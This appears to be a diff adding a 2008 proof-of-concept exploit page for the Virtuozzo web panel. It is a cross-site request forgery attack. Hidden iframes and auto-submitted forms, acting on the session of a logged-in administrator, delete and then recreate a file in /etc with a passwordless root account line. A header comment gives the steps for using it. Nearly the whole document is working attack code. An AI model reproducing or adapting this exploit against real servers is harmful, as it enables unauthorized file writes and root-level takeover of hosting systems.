@@ -1,0 +1,71 @@
+&lt;!--
+poplix papuasia.org -- http://px.dynalias.org -- 04-02-2008
+
+this file exploits a vulnerable installation of virtuozzo web panel by
+overwriting /etc/passwd.demo
+tested against Version 365.6.swsoft (build: 4.0.0-365.6.swsoft). It 
+doesn&#039;t
+work with older version due to paths changes.
+perform the following steps to test it:
+1. create a blank /etc/passwd.demo on target machine
+2. in this file replace 127.0.0.1 with target vps address
+3. open a web browser and log into virtuozzo web interface
+4. open this file in a new browser window and click the &quot;lets rock&quot; 
+button when 
+	the page is fully loaded
+5. check /etc/passwd.demo in the target vps filesystemm
+--&gt;
+
+
+&lt;script language=&quot;JavaScript&quot;&gt;
+var ok=false;
+function letsgo(){
+	ok=true;
+	document.getElementById(&#039;form0&#039;).submit();
+	
+}
+&lt;/script&gt;
+	
+&lt;!-- this sets /etc as the current path--&gt;
+&lt;iframe style=&quot;width:1px;height:1px;visibility:hidden&quot; name=ifr
+src=&quot;https://127.0.0.1:4643/vz/cp/vzdir/infrman/envs/files/index?path=L2V0Yw==&quot;
+&gt;&lt;/iframe&gt;
+
+
+&lt;iframe id=ifr1 style=&quot;width:1px;height:1px;visibility:hidden&quot; name=ifr1 
+onload=&quot;if(ok)document.getElementById(&#039;form1&#039;).submit();&quot;
+&gt;&lt;/iframe&gt;
+
+&lt;iframe id=ifr2 style=&quot;width:1px;height:1px;visibility:hidden&quot; name=ifr2 
+&gt;
+&lt;/iframe&gt;
+	
+
+&lt;!-- delete /etc/passwd.demo --&gt;
+&lt;form id=form0 target=ifr1 method=post 
+action=&quot;https://127.0.0.1:4643/vz/cp/vzdir/infrman/envs/files/list-control&quot;
+&gt;
+&lt;input type=hidden name=&quot;file-name&quot; value=&quot;passwd.demo&quot;&gt;
+&lt;input type=hidden name=delete value=1&gt;
+&lt;/form&gt;
+
+
+
+&lt;!-- create /etc/passwd.demo --&gt;
+&lt;form id=form1 target=ifr2 enctype=&quot;multipart/form-data&quot; 
+name=&quot;defaultForm&quot; 
+ method=&quot;POST&quot;
+ 
+action=&quot;https://127.0.0.1:4643/vz/cp/vzdir/infrman/envs/files/create-file&quot;&gt;
+
+&lt;input xmlns:http=&quot;http://www.swsoft.com/xsl/cp/http&quot; type=&quot;hidden&quot; 
+name=&quot;step&quot; 
+ value=&quot;gen&quot;&gt;
+
+&lt;input type=hidden name=&quot;file_name&quot; value=&quot;passwd.demo&quot;&gt;
+&lt;input type=hidden name=&quot;file_body&quot; value=&quot;root::0:0::/root:/bin/bash&quot;&gt;
+&lt;input type=hidden name=&quot;next&quot; value=&quot;Create&quot;&gt;
+&lt;/form&gt;
+
+&lt;input type=button value=&quot;lets rock&quot; onclick=&quot;letsgo()&quot;&gt;
+
